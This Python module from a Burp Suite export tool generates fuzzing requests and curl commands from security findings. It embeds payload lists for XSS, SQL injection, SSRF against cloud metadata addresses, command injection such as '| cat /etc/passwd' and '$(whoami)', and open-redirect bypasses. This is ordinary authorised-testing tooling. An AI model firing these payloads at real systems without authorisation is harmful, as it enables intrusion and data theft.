"""
burpmd.fuzzer
=============
Context-aware fuzz payload generator for BurpMD.

Reads the security findings produced by the analyzer and generates
mutated HTTP requests with injection payloads appropriate to each
vulnerability category.  Outputs:

  - FUZZ_MANIFEST.json   (structured fuzz cases per finding)
  - FUZZ_COMMANDS.md      (ready-to-paste curl commands)
"""

from __future__ import annotations

import json
import shlex
import re
from pathlib import Path
from typing import List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .parser import BurpExport, BurpItem


# ---------------------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------------------

_IDOR_PAYLOADS = [
    ("zero", "0"),
    ("one", "1"),
    ("negative", "-1"),
    ("large", "9999999"),
    ("max_int", "2147483647"),
]

_XSS_PAYLOADS = [
    ("basic_script", '<script>alert("XSS")</script>'),
    ("img_onerror", '"><img src=x onerror=alert(1)>'),
    ("svg_onload", "<svg/onload=alert(1)>"),
    ("event_handler", '" onfocus="alert(1)" autofocus="'),
    ("polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"),
    ("dom_injection", '{{constructor.constructor("alert(1)")()}}'),
]

_SQLI_PAYLOADS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("or_true", "' OR 1=1--"),
    ("or_true_double", '" OR 1=1--'),
    ("union_select", "' UNION SELECT NULL,NULL,NULL--"),
    ("time_based_mysql", "'; SELECT SLEEP(5);--"),
    ("time_based_mssql", "'; WAITFOR DELAY '0:0:5';--"),
    ("error_based", "' AND 1=CONVERT(int,(SELECT @@version))--"),
    ("stacked", "'; SELECT 1;--"),
]

_SSRF_PAYLOADS = [
    ("localhost_ipv4", "http://127.0.0.1/"),
    ("localhost_name", "http://localhost/"),
    ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("ipv6_localhost", "http://[::1]/"),
    ("decimal_bypass", "http://2130706433/"),  # 127.0.0.1 in decimal
    ("dns_rebind", "http://spoofed.burpcollaborator.net/"),
]

_CMDI_PAYLOADS = [
    ("semicolon_id", "; id"),
    ("pipe_cat", "| cat /etc/passwd"),
    ("backtick_whoami", "`whoami`"),
    ("dollar_whoami", "$(whoami)"),
    ("newline_id", "\nid"),
    ("and_id", " && id"),
    ("or_id", " || id"),
    ("windows_dir", "& dir"),
]

_REDIRECT_PAYLOADS = [
    ("external_https", "https://example.invalid/"),
    ("protocol_relative", "//example.invalid/"),
    ("backslash_bypass", "\\example.invalid/"),
    ("at_bypass", "https://target.invalid@example.invalid/"),
    ("null_byte", "https://example.invalid/%00target.invalid"),
    ("javascript", "javascript:alert(document.domain)"),
    ("data_uri", "data:text/html,<script>alert(1)</script>"),
]

# Map finding categories to payload sets
_CATEGORY_PAYLOADS = {
    "IDOR": _IDOR_PAYLOADS,
    "Reflected Input (XSS candidate)": _XSS_PAYLOADS,
    "Information Disclosure": _SQLI_PAYLOADS,
    "Sensitive Data Exposure": _SQLI_PAYLOADS,
    "Open Redirect": _REDIRECT_PAYLOADS,
    "CORS Misconfiguration": [],
    "Authentication": [],
    "Cookie Security": [],
    "Security Headers": [],
    "HTTP Methods": [],
    "JWT Security": [],
}


# ---------------------------------------------------------------------------
# Finding-to-item lookup
# ---------------------------------------------------------------------------

def _build_item_index(export: BurpExport) -> dict[str, BurpItem]:
    """Build a slug â†’ BurpItem lookup for fast retrieval."""
    return {item.slug: item for item in export.items}


def _find_item_for_finding(
    finding: dict, export: BurpExport, item_index: dict[str, BurpItem]
) -> Optional[BurpItem]:
    """Locate the BurpItem associated with a finding."""
    items = finding.get("items", [])
    if items:
        slug = items[0]
        if slug in item_index:
            return item_index[slug]
    # Fallback: match by host + path from the title
    title = finding.get("title", "")
    host = finding.get("host", "")
    for item in export.items:
        if item.host == host:
            ep = f"{item.method} {item.path}"
            if ep in title:
                return item
    return None


# ---------------------------------------------------------------------------
# Injection point detection
# ---------------------------------------------------------------------------

def _detect_injection_points(item: BurpItem, finding: dict) -> list[dict]:
    """
    Analyze a finding + its source item to determine where to inject payloads.
    Returns a list of injection point descriptors.
    """
    points = []
    detail = finding.get("detail", "")
    category = finding.get("category", "")

    # IDOR: look for numeric IDs in path or query params
    if category == "IDOR":
        # Path segments with numeric IDs
        path_parts = (item.path or "").split("/")
        for i, part in enumerate(path_parts):
            if re.match(r"^\d{1,10}$", part):
                points.append({
                    "type": "path_segment",
                    "index": i,
                    "original_value": part,
                    "param_name": f"path[{i}]",
                })
        # Query params
        try:
            parsed = urlparse(item.url or "")
            for k, v in parse_qsl(parsed.query):
                if k.lower() in {
                    "id", "uid", "user_id", "userid", "account_id",
                    "order_id", "doc_id", "file_id", "project_id",
                    "customer_id", "invoice_id", "record_id", "item_id",
                    "profile_id",
                }:
                    points.append({
                        "type": "query_param",
                        "param_name": k,
                        "original_value": v,
                    })
        except Exception:
            pass
        # JSON body
        if item.request_body:
            try:
                body_json = json.loads(item.request_body)
                if isinstance(body_json, dict):
                    for k, v in body_json.items():
                        if k.lower() in {
                            "id", "uid", "user_id", "userid", "account_id",
                            "order_id", "doc_id", "file_id",
                        } and isinstance(v, (int, str)):
                            points.append({
                                "type": "json_body",
                                "param_name": k,
                                "original_value": str(v),
                            })
            except (json.JSONDecodeError, ValueError):
                pass

    # XSS: reflected params
    elif "Reflected" in category or "XSS" in category:
        param_match = re.search(r"param '(\w+)'", detail)
        if param_match:
            param_name = param_match.group(1)
            try:
                parsed = urlparse(item.url or "")
                for k, v in parse_qsl(parsed.query):
                    if k == param_name:
                        points.append({
                            "type": "query_param",
                            "param_name": k,
                            "original_value": v,
                        })
                        break
            except Exception:
                pass

    # Open Redirect
    elif category == "Open Redirect":
        param_match = re.search(r"Param '(\w+)'", detail)
        if param_match:
            param_name = param_match.group(1)
            try:
                parsed = urlparse(item.url or "")
                for k, v in parse_qsl(parsed.query):
                    if k == param_name:
                        points.append({
                            "type": "query_param",
                            "param_name": k,
                            "original_value": v,
                        })
                        break
            except Exception:
                pass

    # Fallback: if no specific injection point found, try all query params
    if not points:
        try:
            parsed = urlparse(item.url or "")
            for k, v in parse_qsl(parsed.query):
                points.append({
                    "type": "query_param",
                    "param_name": k,
                    "original_value": v,
                })
        except Exception:
            pass

    return points


# ---------------------------------------------------------------------------
# Request mutation
# ---------------------------------------------------------------------------

def _mutate_request(
    item: BurpItem,
    injection_point: dict,
    payload_value: str,
) -> dict:
    """
    Create a mutated request descriptor by injecting a payload at
    the specified injection point.
    """
    method = item.method or "GET"
    original_url = item.url or ""
    headers = dict(item.request_headers) if item.request_headers else {}
    body = item.request_body or ""

    parsed = urlparse(original_url)
    ip_type = injection_point["type"]

    if ip_type == "path_segment":
        idx = injection_point["index"]
        parts = parsed.path.split("/")
        if 0 <= idx < len(parts):
            parts[idx] = payload_value
        new_path = "/".join(parts)
        new_url = urlunparse(parsed._replace(path=new_path))

    elif ip_type == "query_param":
        param_name = injection_point["param_name"]
        qs_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        new_pairs = []
        replaced = False
        for k, v in qs_pairs:
            if k == param_name and not replaced:
                new_pairs.append((k, payload_value))
                replaced = True
            else:
                new_pairs.append((k, v))
        if not replaced:
            new_pairs.append((param_name, payload_value))
        new_query = urlencode(new_pairs)
        new_url = urlunparse(parsed._replace(query=new_query))

    elif ip_type == "json_body":
        param_name = injection_point["param_name"]
        try:
            body_json = json.loads(body)
            if isinstance(body_json, dict) and param_name in body_json:
                original = body_json[param_name]
                if isinstance(original, int) and not isinstance(original, bool) and re.fullmatch(r"-?\d+", payload_value):
                    body_json[param_name] = int(payload_value)
                else:
                    body_json[param_name] = payload_value
                body = json.dumps(body_json)
        except (json.JSONDecodeError, ValueError):
            pass
        new_url = original_url

    else:
        new_url = original_url

    headers = {k: v for k, v in headers.items() if k.lower() not in {"content-length", "transfer-encoding"}}
    return {
        "method": method,
        "url": new_url,
        "headers": headers,
        "body": body,
    }


def _request_to_curl(req: dict) -> str:
    """Convert a mutated request descriptor into a curl command."""
    parts = ["curl", "--silent", "--show-error", "--max-time", "30", "-X", shlex.quote(req["method"])]
    for k, v in req.get("headers", {}).items():
        if k.lower() in ("host", "content-length", "transfer-encoding") or k.startswith(":"):
            continue
        parts.extend(["-H", shlex.quote(f"{k}: {v}")])
    if req.get("body"):
        parts.extend(["--data-raw", shlex.quote(req["body"])])
    parts.extend(["--url", shlex.quote(req["url"])])
    return " ".join(parts)



# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate_fuzz_manifest(
    export: BurpExport,
    output_dir: Path,
    findings: Optional[list] = None,
    verbose: bool = False,
) -> None:
    """
    Generate fuzz payloads and commands from security findings.

    Outputs FUZZ_MANIFEST.json and FUZZ_COMMANDS.md.
    """
    if verbose:
        print("[*] Generating fuzz manifest from security findings...")

    # Load findings if not passed
    if findings is None:
        findings_path = output_dir / "security-findings.json"
        if findings_path.exists():
            findings = json.loads(findings_path.read_text(encoding="utf-8"))
        else:
            if verbose:
                print("  [!] No security-findings.json found. Run --auto-findings first.")
            return


    item_index = _build_item_index(export)
    manifest_entries = []
    curl_blocks = []
    total_cases = 0

    for f_idx, finding in enumerate(findings):
        category = finding.get("category", "")
        payloads = _CATEGORY_PAYLOADS.get(category, [])
        if not payloads:
            continue

        item = _find_item_for_finding(finding, export, item_index)
        if not item:
            continue

        injection_points = _detect_injection_points(item, finding)
        if not injection_points:
            continue

        finding_cases = []
        finding_curls = []

        for ip in injection_points:
            for payload_label, payload_value in payloads:
                # For IDOR, also add relative offsets
                actual_payloads = [(payload_label, payload_value)]
                if category == "IDOR" and ip["original_value"].isdigit():
                    orig = int(ip["original_value"])
                    actual_payloads.extend([
                        ("prev_id", str(orig - 1)),
                        ("next_id", str(orig + 1)),
                    ])

                for label, value in actual_payloads:
                    mutated = _mutate_request(item, ip, value)
                    case = {
                        "id": f"fuzz_{f_idx:03d}_{ip['param_name']}_{label}",
                        "finding_title": finding.get("title", ""),
                        "category": category,
                        "severity": finding.get("severity", ""),
                        "injection_point": ip["param_name"],
                        "injection_type": ip["type"],
                        "original_value": ip["original_value"],
                        "payload_label": label,
                        "payload_value": value,
                        "request": mutated,
                    }
                    if any(c["id"] == case["id"] for c in finding_cases):
                        continue
                    finding_cases.append(case)
                    finding_curls.append(
                        f"# {case['id']}: {category} â†’ {ip['param_name']} ({label})\n"
                        + _request_to_curl(mutated)
                    )
                    total_cases += 1

        if finding_cases:
            manifest_entries.extend(finding_cases)
            curl_blocks.extend(finding_curls)

    # Write manifest JSON
    manifest = {
        "summary": {
            "total_findings_analyzed": len(findings),
            "total_fuzz_cases": total_cases,
            "categories_covered": sorted(set(
                c["category"] for c in manifest_entries
            )),
        },
        "fuzz_cases": manifest_entries,
    }
    manifest_path = output_dir / "FUZZ_MANIFEST.json"
    manifest_path.parent.mkdir(parents=True, exist_ok=True)
    manifest_path.write_text(
        json.dumps(manifest, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    # Write curl commands markdown
    md_lines = [
        "# Fuzz Commands\n",
        "> Auto-generated fuzz payloads from BurpMD security findings.",
        "> Each command tests a specific injection point with a targeted payload.\n",
        f"**Total fuzz cases:** `{total_cases}`\n",
        "---\n",
    ]

    # Group by category
    by_cat: dict[str, list[str]] = {}
    for case, curl in zip(manifest_entries, curl_blocks):
        cat = case["category"]
        by_cat.setdefault(cat, []).append(curl)

    for cat, curls in by_cat.items():
        md_lines.append(f"## {cat}\n")
        for curl_cmd in curls:
            md_lines.append(f"```bash\n{curl_cmd}\n```\n")

    md_lines.append("---")
    md_lines.append("*Generated by **BurpMD Parser Pro** â€” Fuzzer Module*\n")

    fuzz_cmd_path = output_dir / "FUZZ_COMMANDS.md"
    fuzz_cmd_path.write_text("\n".join(md_lines), encoding="utf-8")

    if verbose:
        print(f"[+] Fuzz manifest: {total_cases} cases â†’ FUZZ_MANIFEST.json, FUZZ_COMMANDS.md")
